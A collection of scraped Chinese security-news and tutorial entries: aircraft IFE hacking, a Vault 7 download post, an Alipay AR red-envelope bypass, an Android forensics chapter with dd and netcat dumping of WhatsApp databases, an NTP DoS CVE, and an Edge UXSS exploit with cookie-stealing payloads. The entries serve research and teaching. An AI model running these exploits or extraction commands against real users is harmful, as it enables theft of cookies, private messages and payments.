单元，控制专业音频系统，照明灯等。如果将所有这些攻击连环在一起，恶意攻击者就有可能令乘客出现恐慌。捕获个人信息，包括信用卡的详细信息，虽然这不在本研究的范围内，但是如果一个后台配置不当，某些时候有可能会提供频繁飞行者/VIP会员数据的访问功能，那捕获个人信息在技术上是有可能。从光明的一面，而不是在松下电子IFE系统的研究范围，我相信机载WI-FI本身不是一个问题，因为它可以安全的实现，但仅仅只是WI-FI本身。这一切意味着，经过初步分析，我们不相信这些系统可以抵御熟练的恶意人员发起的坚实攻击。航空公司必须保持警惕，当攻击来自机载娱乐系统时，确保该系统和其它系统是正确隔离的，并且具体分析每架飞机的安全态势。安全责任不仅只是某个IFE制造商，飞机制造商、或航空运营商的。和安全相关的每一方，都要发挥重要作用。负责任的披露在2015年3月份，我已经向松下航空电子公司报告了我们研究结果，我相信他们有足够的时间去生产和开发补丁，至少对于最突出的漏洞。就是说，我们相信，在这种异构环境中，在涉及众多航空公司，以及数以百计版本的可用软件的情况下，很难说这些问题是不是已经完全解决。","2016-12-22 12:57:01","无线安全","黑客通过机载娱乐系统攻击飞机","http://nsoad.com/Article/wifi/20161222/927.html"
"5ccbf9f44f2f0a0a7a69bff2","我们已经在对档案进行分析并提取干货，欢迎大家留意后续干货利用分析文章。","bobylive","美国时间 2017 年 3 月 7 日，WikiLeaks 开始使用一个新的代号 Vault 7 作为美国中情局（CIA）的敏感信息披露计划，这次被发布的第一份档案 Year Zero 大小高达 513MB，一共包含 8,761 份相关敏感文档。根据维基解密的阐述，这份包含了大量 0day，恶意软件，病毒，木马以及相关文档的高度机密资料，在美国政府黑客和承包商之间传播，其中有人向维基解密提交了这份绝密档案的部分内容。从 2001 年起，中情局（CIA）获得了比美国国家安全局（NSA）更高的政治和财政预算的优先权，从那时起，美国中情局不仅仅建立了臭名昭著的 Drone Fleet（无人机舰队），还在全球部署了自己的黑客武装力量，该机构的黑客不必向其竞争对手 NSA 再披露自己的非授权入侵行为。直到 2016 年底，CIA 的黑客部门正式隶属于网络智能中心 （CCI），拥有超过 5,000 名登记的员工，并开发了超过 1,000 个网络攻击武器，代码量超过了 Facebook，从此举看来，CIA 在其内部建立起了属于自己的国家安全局，它的责任机制比 NSA 更少。Year Zero 作为披露计划的第一部分，档案说明了 CIA 在全球部署的恶意软件的范围和目标，军火库包含了美国和欧洲公司的产品的 0day exploit，包括 Apple 的 iOS，Google 的 Android，甚至连 Samsung TV 都成为了监控对象。档案下载档案种子地址：https://team.armyzer0.com/files/WikiLeaks-Year-Zero-2017-v1.7z.torrent档案发布地址：https://wikileaks.org/ciav7p1/档案解压密码：SplinterItIntoAThousandPiecesAndScatterItIntoTheWinds我们已经在对档案进行分析并提取干货，欢迎大家留意后续干货利用分析文章。（Teams: Armyzer0）","2017-03-12 13:19:54","安全工具","WikiLeaks Vault 7档案下载（包含大量 CIA 工具和文档）","http://nsoad.com/Security-tools/20170312/tools-1113.html"
"5ccbf9fd4f2f0a0a7a69bff3","支付宝新版本更新之后，带来了全新红包玩法——AR实景红包。","kong","支付宝新版本更新之后，带来了全新红包玩法——AR实景红包。中午吃饱喝足，大家在工位上围成一团拿出手机玩了起来，玩着玩着我们讨论的话题从“唉？这个红包怎么扫？”“哪有红包？哪呢？在哪呢？让我来！”变成了”你们说这红包是不是能通过其他方式领到？“”这红包里的图片ＰＳ一下是不是能直接扫一扫领取红包呀？””小刘你试试？””好啊，那咱试试呗！“说干就干！我们的射鸡狮小刘同学，打开PhotoShop，开始了花式“破解”支付宝AR红包的测试！没想到小刘同学这么给力，三两下就“破解”了支付宝AR红包，为了验证我们的破解是可重复的，我们测试了不同的红包图片内容，并尝试用不同的方式”破解“，下面为大家简单介绍一下我们的成果。 方法一：PS 人像“破解” 1.按住看线索，截图2.按照红包图中黑色条纹画出相等的条纹3.新的条纹向下移动单条等高的距离，然后复制截图内容4.将复制的内容整体向上移动到最初的黑条位置5.最后对着电脑扫一扫，bingo……方法二：文字“破解”此静物背景主题是文字，直接ＰＳ出类似文字即可。并不需要真的杂志。可能类似于OCR识别这种。 方法三：截屏“破解”注意：本方法暂时适用于iphone6手机或者1334*750的图1.打开支付宝 找到一个ar红包，然后长按看线索。截屏。 2.打开 crack_alipay_ar 然后上传你截屏的红包图，等待系统返回破解完的完整图，就成功了！（http://cdn.liuliangjiekou.com/cdn/html/08/  开源的自动去除横线的脚本） 方法四：截图法  本方法简单上手1.先按照一方法的1步骤截图，然后使用ps软件将小方块的图裁出来2.继续打开我们的api，选择方法2上传 然后键盘上下键操作就可以了（http://cdn.liuliangjiekou.com/cdn/html/08/  开源的自动去除横线的脚本） 3.支付宝红包扫一扫 方法五：支付宝红包去黑线算法1.代码在github上面 上面那个网址，php写的，直接跑一下php就知道了，首先找到一张我们想要的图片注：本方法仅供开发者使用，请勿用于商业目的，本作者拥有最终最高解释权，照片中出现的女士，如侵犯肖像权请联系安全客（duping@360.cn)转载请保留原创地址https://github.com/shenzhenjinma/aliredenvelope2.电脑打开看一下3.近看一下4.通过算法将黑线去掉，这里我用php花了2分钟写的5.近看一下处理后的图片6.用手机扫一扫7.成功！ 结语 射鸡狮小刘同学表示经过大量的样本测试，发现人像的图片似乎更容易被""破解""，似乎其中有什么隐藏的暗物质。 热心网友对支付宝AR红包的评论  参考链接http://cdn.liuliangjiekou.com/cdn/html/08/  开源的自动去除横线的脚本https://www.baidu.com/link?url=CPrJ9EwESBbvkkPYb9V1Ie-l9CfU1GxxoCFhZU0kxI2YtZbwR6ioLgxrL-AoEY9e&amp;wd=&amp;eqid=b6d0c087000ab13a00000003585e0f64  堕络's Bloghttp://cdn.liuliangjiekou.com/cdn/html/08/  linux博客https://github.com/shenzhenjinma/aliredenvelope注：参考链接目前访问量较大，打不开网址的可以上github自己下载","2016-12-24 16:26:16","移动安全","技术流花式“破解”支付宝AR红包，更多技巧征集中(12.24更新）","http://nsoad.com/Article/MobileSecurity/20161224/936.html"
"5ccbf9fd4f2f0a0a7a69bff4","取证是使用不同的手动和自动方法从设备中提取和分析数据。它可以大致分为两类：","Aditya Gupta","本文来源：看雪学院  编译作者：飞龙使者   原文出自：Learning Pentesting for Android Devices  网络攻防小组Kong.整理发布5.1 取证类型取证是使用不同的手动和自动方法从设备中提取和分析数据。它可以大致分为两类：逻辑采集：这是的一种取证方法，其中取证员与设备交互并从文件系统提取数据。该数据可以是任何内容，诸如应用特定数据，联系人，通话记录，消息，web 浏览器历史，社交网络用户信息和财务信息。逻辑采集的优点是，在大多数情况下比物理采集更容易获取逻辑信息。然而，在一些情况下，该方法的一个限制是，在这种情况下的证据（智能手机及其数据）具有被篡改的高风险。物理采集：这意味着对整个物理存储介质进行逐位拷贝。我们还可以在执行物理采集时定位不同的单个分区。与逻辑采集相比，这种方法慢得多，但更可靠和可信赖。此外，为了在智能手机上执行物理采集，检查者需要熟悉不同类型的文件系统，例如 Yet Another Flash File System 2（YAFFS2），ext3，ext4，rfs 等。5.2 文件系统在我们深入取证以及从设备提取数据之前，我们应该清楚地了解文件系统类型和它们之间的差异。正如我们前面讨论的，在 Android 中进行物理采集有点棘手，一个主要原因是文件系统不同。Android 文件系统的主分区通常被分区为 YAFFS2。在 Android 中使用 YAFFS2 的原因是，它为设备提供了优势，这包括更高的效率和性能，以及更低的占用空间。几年前，当 Android 刚刚推出时，取证是平台上的一个大问题，因为几乎没有支持 YAFFS2 文件系统格式的取证工具。SD 卡是 FAT32 类型，是正常系统用户中的共享格式。因此，为了获取 SD 卡的映像，可以使用任何常规的数据采集取证工具。制作副本或创建现有数据系统映像的最有名的工具之一是 dd，它从原始来源到系统进行逐块复制。然而，由于该工具的一些缺点，例如缺少内存块以及跳过坏块，会导致数据损坏，因此不推荐在取证调查期间使用。在接下来的章节中，我们将深入介绍 Android 文件系统，并将研究如何以最有效的方式从文件系统中提取数据。Android 文件系统分区正如我们在前面的章节中讨论的，Android 基于 Linux 内核，并从 Linux 本身派生其大部分功能和属性。 在 Android 中，文件系统被划分为不同的分区，每个分区都具有重要意义。为了在 Android 设备上查看分区，我们可以使用adb shell然后查看proc下的mtd文件，如下面的命令所示。 在一些不存在mtd文件的设备中，在proc下有另一个名为partitions的文件，如下面的命令所示：adb shellcat /proc/mtd1212以下是在设备上执行上述命令来列出所有分区后的输出的屏幕截图。正如我们在上面截图中看到的，存在各种文件系统分区及其各自的大小。 在大多数 Android 设备上，我们通常会看到一些数据分区，如system，userdata，cache，recovery，boot，pds，kpanic和misc，它们安装在dev列指定的不同位置。 为了看到不同的分区和类型，我们可以在adb shell中键入mount。正如我们在下面的截图中可以看到的，通过执行mount命令列表，所有不同的分区及其位置将被挂载：5.3 使用dd提取数据dd工具是取证中最常用的工具之一，以便为数据提取过程创建映像。 换句话说，它用于将指定的输入文件转换并复制为输出文件。 通常在分析期间，我们不允许与证据直接交互和更改。 因此，获得设备文件系统的映像，然后对其执行分析总是一个好的选择。默认情况下，dd工具在大多数基于 Linux 的系统中，以及在 Android 设备中的/system/bin中都存在。 如果它不存在于你的设备中，您可以安装 BusyBox，它将安装dd以及一些其他有用的二进制文件。 你可以从 BusyBox 应用程序（https://play.google.com/store/apps/details?id=stericson.busybox）获取dd的二进制文件，或者你甚至可以自己交叉编译。dd的标准语法如下：dd if = [source file which needs to be copied] of = [destination file to be created]11有几个命令行选项可以与dd一起传递，其中包括：if：这是要复制的输入文件of：这是内容要复制给它的输出文件bs：这是块大小（一个数字），指定dd复制映像的块大小skip：这是在开始复制过程之前要跳过的块数让我们现在继续，并取得现有分区之一的映像来进行取证我们需要找到的第一个东西是不同的分区，它们存在于我们的 Android 设备上，就像我们之前做的一样。 这可以通过查看/proc/mtd文件的内容来完成。接下来，我们需要了解数据分区的位置，因为这里我们采集数据分区的备份。 在这种情况下，它位于mtdblock6。 这里，我们将启动dd，并将映像存储在sdcard中，稍后我们将使用adb pull命令拉取映像。 adb pull命令只是简单地允许你将文件从设备拉取到本地系统。复制可能需要一些时间，一旦复制完成，我们可以退出adb shell，访问我们的终端，并键入以下代码：adb pull /mnt/sdcard/data.img data.img11我们还可以使用 Netcat 工具将映像直接保存到远程位置/系统。 为此，我们首先需要将端口从设备转发到系统。adb forward tcp:5566 tcp:556611同时，我们需要在这里启动 Netcat 工具，监听端口 5566。nc 127.0.0.1 5566 &gt; data.img11此后，我们必须执行adb shell进入设备，然后启动dd工具，并将输出转发到 Netcat。nc -l -p 5566-e dd if=/dev/block/mtdblock611这将把映像保存到系统中，而不是保存在设备上的任何位置，然后再拉取它。 如果你的手机上没有dd二进制，你也可以安装 BusyBox 来获得dd二进制。开始取证调查之前应该确保的一件事是，检查设备是否被设置为在超级用户模式下操作，这通常需要设备的 root。 然而，我们遇到的所有设备并不都是 root。 在这些情况下，我们将使用我们的自定义恢复映像来启动手机，然后 root 设备。5.4 使用 Andriller 提取应用数据Andriller 是由 Denis Sazonov 以 Python 编写的开源多平台取证工具，它有助于从设备中提取一些基本信息，并且有助于进行取证分析。 分析完成后，将生成 HTML 格式的取证报告。为了下载它，我们可以访问官方网站http://android.saz.lt/cgi-bin/download.py并下载必要的包。 如果我们在 Linux 或 Mac 环境中，我们可以简单地使用wget命令来下载并解压软件包。 因为它只是一个 Python 文件，以及一些其他必要的二进制文件，所以没有必要安装它; 相反，我们可以直接开始使用它。$ wget http://android.saz.lt/download/Andriller_multi.tar.gz Saving to: 'Andriller_multi.tar.gz' 100%[=============================&gt;] 1,065,574    114KB/s   in 9.2s 2013-12-27 04:23:22 (113 KB/s) - 'Andriller_multi.tar.gz' saved [1065574/1065574]   $ tar -xvzf Andriller_multi.tar.gz123456789123456789一旦解压完成，我们可以访问 Andriller 文件夹，之后只需使用python andriller.py运行它。 Andriller 的主要依赖之一是 Python 3.0。 如果你使用 Python 2.7 ，它预装在大多数操作系统上，你可以从官方网站http://python.org/download/releases/3.0/或http://getpython3.com/下载 3.0 版本 。现在，一旦我们连接了设备，我们可以继续运行Andriller.py，以便从设备捕获信息，并创建日志文件和数据库。$ python Andriller.py11一旦开始运行，我们会注意到，它会打印出设备的几个信息，如 IMEI 号码，内部版本号和安装的社交网络应用程序。 这里，它检测到 WhatsApp 应用程序以及与其相关联的电话号码，因此它将继续并拉取 WhatsApp 应用程序的所有数据库。分析完成后，我们将看到类似以下屏幕截图的屏幕：如果我们查看它为我们创建的 HTML 文件，它将显示一些关于设备的基本信息，如下面的屏幕截图所示。 它还在文件夹db下的同一文件夹目录中创建所有数据库的转储。如果我们分析这个应用程序的源代码，我们可以在Andriller.py的源代码中看到，它会检查设备中存在的不同包。 我们还可以在这里添加我们自己的包并保存数据库，我们希望 Andriller 为我们寻找它。如下面的截图所示，你可以手动添加更多要使用 Andriller 备份的数据库。5.5 使用 AFLogical 提取所有联系人、通话记录和短信AFLogical 是由 viaForensics 编写的工具，以便从设备创建逻辑采集并将结果呈现给取证员。它从设备中提取一些关键组件，包括短信，联系人和通话记录。为了使用 AFLogical，我们需要从 GitHub 库https://github.com/viaforensics/android-forensics下载项目的源代码。下载后，我们可以将此项目导入我们的 Eclipse 工作区并进行构建。我们可以从我们现有的代码中访问File | New | Other | Android | Android Project，然后选择下载的源代码路径。一旦我们将项目导入到我们的工作区，我们就可以在我们的设备上运行它，方法是右键单击项目并选择“运行为 Android 应用程序”。一旦我们运行它，我们将注意到，我们的设备上的AFLogical应用程序提供了选项来选择要提取什么信息。在以下屏幕截图中，你将看到 AFLogical 在设备上运行，并询问用户有关要提取的详细信息：我们将检查所有东西，然后单击Capture。 AFLogical 将开始从不同来源捕获详细信息，并将捕获的详细信息保存在 SD 卡中的csv文件中。 捕获过程完成后，我们会注意到一个警告框。我们现在可以查看我们的 SD 卡路径，我们可以找到保存的.csv文件。然后我们可以在任何.csv文件查看器中打开这些.csv文件来查看详细信息。 因此，AFLogical 是一个快速有效的工具，用于从设备中提取一些信息，如联系人，通话记录和消息。5.6 手动转储应用的数据库既然我们已经看到，很多工具可以帮助我们进行取证，我们还可以使用adb和我们的手动技能从设备中提取一些信息。 正如我们之前学到的，应用程序文件存储在/data/data/[应用程序的包名]/位置。 由于大多数应用程序也使用数据库来存储数据，我们注意到在名为directory的包中有另一个名为databases的文件夹。 这里需要注意的一点是，这只会帮助我们从使用数据库的应用程序中提取信息，以便转储应用程序和其他相关信息。 在某些应用程序中，我们可能还会注意到，应用程序将数据存储在 XML 文件中或使用共享首选项，我们需要手动审计它们。Android 使用 SQLite 数据库（我们将在下一章深入讨论）与.db文件格式。 下面是手动提取所有数据库的步骤：进入设备，并创建一个文件夹来存储所有数据库查找所有.db文件并将其复制到创建的文件夹压缩文件夹并拉取它因此，我们可以使用adb shell查找/data/data/location中的所有数据库文件，将它们压缩到归档文件中，然后将其拉取出来。在 SD 卡中创建一个名为BackupDBS的文件夹。为此，我们可以简单地执行adb shell，然后在/mnt/sdcard下创建一个名为BackupDBS的文件夹：adb shell mkdir /mnt/sdcard/BackupDBS1212查找所有.db文件并将其复制到BackupDBS。为此，我们可以使用一个简单的命令行绝技来查找和复制/data/data中的所有.db文件。 我们首先使用find命令查找所有.db文件。 在以下命令中，我们使用find工具，并指定从当前位置搜索，然后查找具有任何文件名（通配符*）以及扩展名db的所有文件（即*.db），以及类型为文件f。find . -name ""*.db"" -type f11下面的截图展示了输出：现在，我们可以简单地使用cp和find，以便将其复制到BackupDBS目录find . -name ""*.db"" -type f -exec  cp {} /mnt/sdcard/BackupDBS \;11现在，如果我们查看/mnt/sdcard下的BackupDBS目录，我们的所有数据库都已成功复制到此位置。压缩并拉取文件。 现在，在同一位置，我们可以使用tar工具创建一个压缩包，并使用adb pull。tar cvf backups.tar BackupDBS/11然后，从系统中，我们可以简单地像这样拉取它。 此方法也可以用于通过在/data/app和/data/app-private文件夹中查找文件类型.apk，来从手机中拉取所有.apk文件。如果我们仔细看一看，在我们的backups.tar中，还有一个名为msgstore.db的 WhatsApp 应用程序的数据库。 让我们继续分析和研究数据库内部的内容。 为此，我们需要首先解压我们刚才拉取的tar归档文件。tar -xvf backups.tar11现在，为了分析名为msgstore.db的 WhatsApp 的 SQLite 数据库，我们可以下载并使用任何 SQLite 浏览器。 对于本书，我们使用 SQLite 数据库浏览器，可以从http://sourceforge.NET/projects/sqlitebrowser/下载。现在，如果我们在 SQLite 数据库浏览器中打开msgstore.db文件并访问浏览器数据，我们可以在 SQLite 浏览器中看到我们的所有 WhatsApp 对话。 在以下截图中，我们可以看到在 SQLite 数据库浏览器中打开的msgstore.db，它显示 WhatsApp 应用程序的所有聊天对话：5.7 使用 logcat 记录日志Android logcat 有时在取证调查期间很有用。 它包含在电话以及收音机上执行的所有活动的日志。 虽然不完整，它可以帮助调查员了解设备中发生了什么。为了捕获和保存 logcat 转储文件，我们可以简单地使用adb logcat并将输出保存到一个文件，稍后我们可以分析它。adb logcat &gt; logcat_dump.log11我们还可以使用logcat以更加详细和有用的方式获取日志。 例如，我们可以通过指定-b参数和radio来获取收音机日志。 -b标志用于显示缓冲区（如收音机或事件）的 logcat。 -v标志用于控制输出格式，它代表verbose（详细），也可以是time，brief，process，tag，raw，threadtime或long。 除了-v，我们还可以使用-d（调试），-i（信息），-w（警告）或-e（错误）。adb logcat -v time -b radio -d 11我们还可以使用其他工具，如dmesg，它将打印内核消息，以及getprop，它将打印设备的属性：adb shell getprop11XDA 开发人员成员 rpierce99 还提供了一个应用程序，用于自动捕获来自 logcat 和其他相关来源的信息，这些信息可以从https://code.google.com/p/getlogs/下载并使用。5.8 使用备份功能来提取应用数据Android 从 4.0 起引入了使用adb的备份功能。 此功能可用于创建应用程序的备份及其整个数据。 这在取证上非常有用，因为取证员可以捕获应用程序及其整个数据。 请参阅以下步骤：这可以通过在终端中执行adb backup命令，后面附带应用程序的包名来完成。 如果我们不知道应用程序的准确包名称，我们可以使用pm列出所有包，然后过滤应用程序名称。执行此操作的另一种方法是使用pm list package命令，其中-f标志指定要在包名称中查找的字符串。接下来，我们可以简单地使用应用程序的包名称，来备份任何我们需要的应用程序。adb backup [package name] -f [destination file name]11目标文件将以文件扩展名.ab（Android 备份）存储。 在这里，我们采集了 WhatsApp 应用程序的备份。一旦我们运行命令，它将暂停，并要求我们在设备上确认，如下面的截图所示：在这里，我们需要选择Back up my data（备份我的数据）选项，并且还可以为备份指定加密密码。 一旦备份过程完成，我们将获得whatsapp_backup.ab文件。接下来，我们需要解压此备份，以便从.ab文件获取数据库。 为此，我们将使用dd和openssl创建一个.tar文件，然后我们可以解压它。现在，由于我们获得了.tar文件，我们可以使用tar xvf简单解压它。一旦它解压完成，我们可以访问apps/[package-name]下的db文件夹，来获取数据库。 这里，程序包名称为com.whatsapp。让我们快速使用ls -l来查看db文件夹中的所有可用文件。 正如你可以看到的，我们拥有msgstore.db文件，它包含 WhatsApp 对话，我们已经在上一节中看到了。总结在本章中，我们分析了执行取证的不同方法，以及各种工具，我们可以使用它们来帮助我们进行取证调查。 此外，我们了解了一些我们可以执行的手动方法，来从设备中提取数据。在下一章中，我们将深入 SQLite 数据库，这是 Android 渗透测试的另一个要素。","2017-02-27 15:08:43","移动安全","Android 渗透测试学习手册（五）Android 取证","http://nsoad.com/Article/MobileSecurity/20170227/1085.html"
"5ccbf9fd4f2f0a0a7a69bff5","研究人员发布了针对cve-2016-9311漏洞的PoC，这个漏洞能够导致NTP守护进程崩溃，并且触发Windows系统拒绝服务。","Kong","研究人员发布了针对cve-2016-9311漏洞的PoC，这个漏洞能够导致NTP守护进程崩溃，并且触发Windows系统拒绝服务。NTP协议能被黑客利用。NTP是一种广泛用于时钟同步的协议，这种协议能够在多个系统同步时间。之前，专家曾报告过NTP协议的漏洞，这个漏洞能够被黑客利用来进行大规模的DDoS攻击。2014年4月，有人使用最大规模(400Gbps)的DDoS NTP放大攻击使得Cloudfare的欧洲服务器陷入瘫痪。本周，网络时间基金会修复了一个漏洞，编号为CVE-2016-9311影响了NTP.org发布的众多nptd，版本号为4.2.8p9之前，4.3.94除外。漏洞的发现者是安全研究员Magnus Stubman。9月29日，Stubman收到了开发的补丁。他在几天后向公众公布了漏洞。新发布的4.2.8p9修复了本漏洞，这个版本还包括共40项安全补丁和改进。可导致Windows拒绝服务漏洞能够导致NTP守护进程崩溃，并且触发Windows系统拒绝服务。 “漏洞能够让未授权的用户用构造好的UDP包是的ntpd崩溃，导致空指针引用。” Stubman在周一的公告中写道。 “根据NTP.org，ntpd没有默认开启trap服务，如果trap被开启，攻击者就能通过特别构造的数据包导致空指针引、ntpd崩溃，进而导致服务器拒绝服务。这个漏洞只影响Windows服务器。”卡内基梅隆大学软件工程学院CERT发布的漏洞记录VU#633847中写道。Stubman发布了针对这一漏洞的PoC。理论上来说任何人都可以通过构造数据包来使Windows服务器崩溃。 “NTP用户应该立即采取行动保证NTP守护进程无法遭攻击。用户们可以趁此机会通过BCP38部署Ingress和Egress过滤。ntp-4.2.8p9已于11月21日发布，新版本修复了1个高危漏洞，2个中危漏洞，2个中低危漏洞和5个低危漏洞，还修复了28个bug和其他一些改进。”由于PoC代码已经流出，请管理员们立即给NTP打上补丁。","2016-11-26","漏洞发布","NTP漏洞可致Windows系统触发DoS","http://nsoad.com/Article/exploit/20161126/vulzone-38.html"
"5ccbf9fe4f2f0a0a7a69bff6","今天，我们来讨论设计上的问题，配合这些问题，我们最终在 Microsoft Edge 浏览器上实现了通用跨站脚本攻击（UXSS）。","kong","今天，我们来讨论设计上的问题，配合这些问题，我们最终在 Microsoft Edge 浏览器上实现了通用跨站脚本攻击（UXSS）。如果你不是安全研究员，但还是想了解此漏洞，你可以这样理解：访问恶意网页，攻击者就能读取你的 Cookie，更改客户端的网页内容，获取个人信息等。此外，由于 Microsoft Edge 使用 受保护的内部资源执行特殊操作，攻击者可能会访问这些资源，并可能设置 Edge 的配置选项，打开 IE 等。我们有段视频展示了针对 bing cookie 的攻击，另一段视频显示 nature.com 的内容。但请记住，这些网站本身没有任何问题：而该漏洞来自 Microsoft Edge 浏览器。下面我们来看看这是怎么做到的。Domainless Worldabout:blank 是个非常特殊的 URL，有时会使人感到困惑，不知道属于哪里。思考一下：如果我们位于 www.magicmac.com/dom/index.html ，document.domain 显然是 www.magicmac.com，但是 about:blank 的域属于什么呢？这就视情况而定了。理论上，它应该匹配 referrer 的域，即设置其网址的网页。例如，如果我们在 www.magicmac.com 点击一个 about:blank 链接，那么该 about:blank 就将 www.magicmac.com 作为它的域。另一个例子是 iframe，其来源指向 about:blank，或者根本没有源（浏览器默认为 about:blank）。所以，从 goodfellas.com 加载 about:blank 看起来和从 evil.com 加载差不多，因为两个 URL 是相同的，但他们有不同的 document.domain ，所以它们之间不能互相访问。那么问题来了：我们手动输入到地址栏中的 about:blank 的域是什么？要的就是这个！答案如此重要，所以我把 Devtools 放大了看。是空的，如我们所见，它有巨大的力量，但是为了确保我们是在同一页面，我们调用一个没有域的“无域名”（domainless）和“有域”的（domained）的 URL，链接至有 document.domain 的网站。Bug hunter，本篇文章以下便是重要的东西了。“A domainless about:blank is capable of accessing any domained about:blank”（无域的 about:blank 能够访问任何有域的 about:blank）换句话说，一个无域的 about:blank 可以无限制访问有域的 about:blank 。我们在此投机取巧，直接在调试控制台操作，快速添加一个 bing.com 的 iframe 到这个页面。document.body.innerHTML = '&lt;iframe src=""http://www.bing.com/images/search?q=microsoft+edge""&gt;&lt;/iframe&gt;'  很好！我们在顶层无域的 blank 中有一个 bing.com 的 frame，但是我们的目标是找到 bing 中的一个空白的 iframe，如我所述，一个无域的 blank (main windows）将能够访问任何有域的 blank（bing.com 中的 iframe）。这种情况下很容易实现，因为我们使用的 bing.com 已经有 blank 的 iframe 了。但让我们继续尝试一下吧！即使来自调试器，下面的这条指令通常拒绝访问，但由于页面的顶层是无域的，它可以运行。那么让我们来一探究竟！window[0][0].location.href = ""javascript:alert(parent.document.domain)"";  Bang！我知道这不会深入你脑海，因为我们是从 DevTool 获得了结果，对吧？但是对我来说，这是我所做的最重要的事情，因为如果我们能够掌握这一理念，接下来发现新的 UXSS 将在一定程度上变得轻松不少。从现在起，每找到一种访问无域的 blank 的方法（一般是 about:blank ，但我们也可以用其他的），我们将得到一个 UXSS。现在是使用 DevTools 的情况，我想确认一下我们完全了解所正在做的，当然我们不需要 DevTools。独立 PoC， 无须 DevTools现在来动真格的吧。我们需要找到一种方法，创建一个可以从普通网页访问的无域网站，更快的方法是使用 data: URI 而不是 about:blank 。同理，至少协议不同。而如果我们在 iframe 内部加载 data: URI ，则其域将与其引用的域相同（就像我们在开头看到的 about:blank 一样），而且如果尝试在顶层加载 data:uri 的数据，Edge 会拒绝将我们送至错误页面。然而，我们有几个小技巧，可以做到获取无域数据的 data:uri ，现在我们来探索 Flash 版的 PoC，因为它及其简单。事实上，我从 2005 年以来一直在使用这个 Flash，它只设置了一个来自查询字符串的 URL，赶快利用它！&lt;iframe src=""geturl.swf?target=_top&amp;redir=data:,[html/script goes here]""&gt;&lt;/iframe&gt;  看到了吗？仅需将你想加载的 URL 添加到 redir 参数中即可。在这种情况下，我们使用了一个 data:uri ，并将其加载在无域的顶层。此外，为了欺骗 Edge 浏览器，我们需要在 iframe 内部加载 swf ，否则将无法达成效果（错误页面）。你可以自己试一下。顺便说一下，别忘了我们可以找到实现同样效果的替代品。我刚刚使用它是因为它是首先被发现的，Adobe 的人可能会将 data:uri 列入黑名单，以便帮助我的 @Edge 朋友摆脱此 bug。然而，有很多方法实现相同的事情而无需 flash 文件。提出你自己的想法，找到自己的方式！OK，现在我们在无域的窗口中，我们可以注入一个指向 bing.com 的 iframe，但是 Edge 处于不能正确渲染页面元素的状态。如果我们尝试使用 createElement/insertAdjacentHtml/etc 它将不能生效。我的意思是，Edge 会绘制一个“死”的 iframe，就像没有引擎的汽车一样：它根本无法正常运行。为了解决此难题，我们使用 document.write 写入自身，强制浏览器再次进行渲染。而且因为我们在无域的 URL 中，document.write 将使我们完全位于同一地址/域之中。document.write('&lt;iframe src=""http://www.bing.com/images""&gt;&lt;/iframe&gt;');  完美！现在我们可以访问 bing 的空白 iframe，但是记得我们这回属于比较幸运，因为并不是所有的站点里面都会有 “free blank iframes”。window[0][0].location.href = ""javascript:alert(parent.document.cookie)"";  MS Edge 的线上 PoC 在此我很兴奋，这次在没有 DevTools 的情况下利用生效了。Oh，no，我知道你在想什么，多疑的 bug hunter:Bing 白白给我们提供了一对空的 iframe，这太简单了！是的，但我只是稍微庆祝一下！从现在开始我会叫你 killjoy!不再是 “bug hunter”。🙂我们继续，killjoy。我知道网站不会喜欢给我们提供空 iframe 的主意，所以我们需要找到自己的方式。Owning non-cooperative sites拿下非合作站点想想一下，我们在第二步顶层是无域的 data: ，而我们的 iframe 正确呈现，但指向 nature.com 而不是 bing.com （因为 nature 有一个非空的 iframe）。如果我们尝试更改 iframe 的地址，Edge 会拒绝打开一个新窗口。换句话说，这种事情是无效的。// We are inside a domainless data: so Edge will open a new// window instead of changing nature-iframe's locationwindow[0][0].location.href = ""about:blank"";  这不会生效的。也行它可以绕过，但我已经进行了足够的尝试。这是在无域的情况下发生的问题，因此我们可以打开一个带有真实 URL 的新窗口，然后从那里再进行处理。这正是我们将要做的：打开一个内有 nature.com iframe 的新窗口。[现在我们在新窗口里面有了一个常规 URL]将 nature 的内部 iframe 的地址更改为 about:blank ，这样我们可以给它一个名称。是的我们希望 iframe 有一个名称。将名称设为 about:blank，那么我们的无域 opener 就能通过 window.open 访问到它了。别忘了我们现在窗口内有一个常规的 URL，它是我们强大的 opener。我们将向这个 iframe 命名，就像这样：window.name = ""DAVID_COPPERFIELD"" ，以纪念这位继续带着激情学习的魔术师。现在我们应该将 about:blank （属于我们的域）的地址设置为 nature 的地址。为此，我们将使用 meta-refresh 将地址更改为 about:blank 。轻而易举。这个技巧确保 about:blank 恢复至其父域的域。让 opener 知道一切就绪，所以它可以访问了，就像这样：window.open(“javascript:alert(document.domain)”, “DAVID_COPPERFIELD”);MS Edge 的线上 PoC 在此再次享受，但这次在房子里欢呼雀跃。Yes！Opsss，我的妻子问我发现了什么。她明白这些尖叫意味着什么。😉killjoy 先生，我们又做到了。PoC 是交互式的，因此我们可以实时了解我们正在做什么，但请阅读代码的具体细节，我确定有改进的余地。如果你提出这些想法，那么你很可能会发现能够实现类似事情的变通方法。研究，学习，学到了！很有趣。在没有 Flash 的情况下，你能找到自己的方法设置无域 URL 的方法吗？是的，你可以的。此外，只要有我们在此一起探讨代码，我们可以创建多种多样的 UXSS 场景，比如在 iframe 访问其顶层。那可能吗？假设我是由 Facebook 呈现的横幅广告。可不可以访问我们的顶层，并获取就像用户好友列表这样的东西？当然！访问不喜欢在框架中呈现的 XFO 站点怎么办？iframe 是唯一能够呈现 HTML 元素的吗？最后，完全没有 iframe 的网站又怎么办？我给你保证，我们甚至能够接触到编制这些代码的人。坐下来探索一下吧！这里有你需要的文件。","2016-12-15 16:43:17","Web安全","UXSS on Microsoft Edge – Adventures in a Domainless World","http://nsoad.com/Article/web/20161215/918.html"
"5ccbf9fe4f2f0a0a7a69bff7","若不可信的数据传入 unserialize() 函数，通过传递立即调用函数表达式（IIFE）的 JavaScript 对象可以实现任意代码执行。","Ajin Abraham","原作者：Ajin Abraham    原文链接：Exploiting Node.js deserialization bug for Remote Code Execution 有增改   译：Holic (知道创宇404安全实验室)tl;dr若不可信的数据传入 unserialize() 函数，通过传递立即调用函数表达式（IIFE）的 JavaScript 对象可以实现任意代码执行。漏洞详情审计 Node.js 代码时，我正好看到一个名为 node-serialize 的序列号/反序列化模块。下面是一段代码示例，来自网络请求的 cookie 会传递到该模块的 unserialize() 函数中。var express = require('express');  var cookieParser = require('cookie-parser');  var escape = require('escape-html');  var serialize = require('node-serialize');  var app = express();  app.use(cookieParser())app.get('/', function(req, res) {   if (req.cookies.profile) {   var str = new Buffer(req.cookies.profile, 'base64').toString();   